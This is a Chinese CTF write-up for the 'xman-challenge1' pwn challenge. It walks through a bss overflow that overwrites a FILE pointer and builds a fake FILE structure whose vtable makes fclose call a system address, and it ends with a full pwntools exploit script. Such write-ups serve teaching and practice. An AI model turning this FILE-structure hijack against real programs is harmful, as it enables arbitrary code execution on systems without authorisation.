# 标题

> xman-challenge1

## **原理**

io_file

## **环境**
Ubuntu 16.04 

## **工具**
ida pro，gdb
## **步骤**


 这是一道关于 io_file 非常简单的题
 
 ![](1.png)
 
 这段程序会向位于bss段的变量s赋值，由上图我们可以发现，一个file指针也位于相差0
 x100个字节的bss段。我们可以通过s来覆盖stream的值，改成一个我们想要的值。
 
 那我们可以先这样写payload：
 
 ```
 payload = 'a' * 0x100 + p64(buf_addr) 
 ```
 
 这样肯定是不行的，但是我们可以先调试一下，看看他会crash在哪里～
 
 ![](2.png)
 
 可以程序crash在了 cmp的语句，原因是`fault address 0x0` 因为现在 寄存器rdx的值为0x6161616161616161，是一个无效的地址。结下来我们看一下 rdx的值是怎么来的。
 
 ![](3.png)
 
 是[rbx+0x88]中的内容，此时 rbx的值 就是buf_addr。
 
 rbx+0x88其实就是 fp->lock 当lock==0的时候，就会不进行cmp操作。
 
 ![](4.png)
 
 由此 我们可以将payload的进化成下面这样：
 
 ```
 payload = ('\0' * 0x88 + p64(buf_addr)).ljust(0x100,'\0')+ p64(buf_addr)
 ```
 
 buf_addr是个有效地址，同时buf_addr+0x88地址上的值 也是 0。
 
 然后继续观察程序crash在了哪里～
 
 ![](5.png)
 
 ![](6.png)
 
 可见call操作的crash 此时rax的值是 0，在这里如果我们控制了rax的值 就可以进行我们想进行的操作，上图可以发现 rax就是[rbx+0xd8] rbx此时的值 就是buf_addr。 这样我们就构造了 下面的这个 payload。

```
pay = (('\0' * 0x10 + \
    p64(system) + \
    '\0' * 0x70 + \
    p64(buf_addr)).ljust(0xd8, '\0') + \
    p64(buf_addr)).ljust(0x100, '\0') + \
p64(buf_addr)
``` 

实际上，当我们调用 fclose的时候，就会触发。

完整exp：

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

binary = './challenge1'
elf = ELF(binary)
libc = elf.libc

io = process(binary)
context.log_level = 'debug'
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-h']

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30

io.recvuntil(">")
io.sendline(str(1))

system = 0x400897
buf_addr = 0x6010c0

pay = (('\0' * 0x10 + \
    p64(system) + \
    '\0' * 0x70 + \
    p64(buf_addr)).ljust(0xd8, '\0') + \
    p64(buf_addr)).ljust(0x100, '\0') + \
p64(buf_addr)
io.sendline(pay)

io.recvuntil(">")
io.sendline('3')

io.interactive()

```


## **参考阅读**

[io_file](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/)